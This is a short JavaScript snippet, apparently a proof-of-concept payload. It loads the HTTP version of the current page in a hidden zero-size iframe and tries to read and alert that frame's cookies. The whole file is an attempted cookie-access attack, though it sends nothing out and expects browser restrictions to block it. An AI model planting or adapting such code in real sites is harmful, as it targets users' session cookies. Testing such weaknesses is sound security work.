(function () {
    // Get the current site URL
    const currentUrl = location.href;

    // Replace HTTPS with HTTP for the iframe URL
    const iframeUrl = currentUrl.replace(/^https:/, "http:");

    // Create an iframe dynamically
    const iframe = document.createElement("iframe");
    iframe.style.width = "0px";
    iframe.style.height = "0px";
    iframe.style.border = "none";
    iframe.src = iframeUrl;

    // Append the iframe to the body
    document.body.appendChild(iframe);

    // Attempt to access cookies from the iframe
    iframe.onload = function () {
        try {
            const iframeCookies = iframe.contentWindow.document.cookie;
            alert("Cookies: " + (iframeCookies || "No accessible cookies found"));
        } catch (error) {
            console.error("Error accessing iframe cookies:", error);
            alert("Unable to access cookies due to security restrictions.");
        }
    };
})();
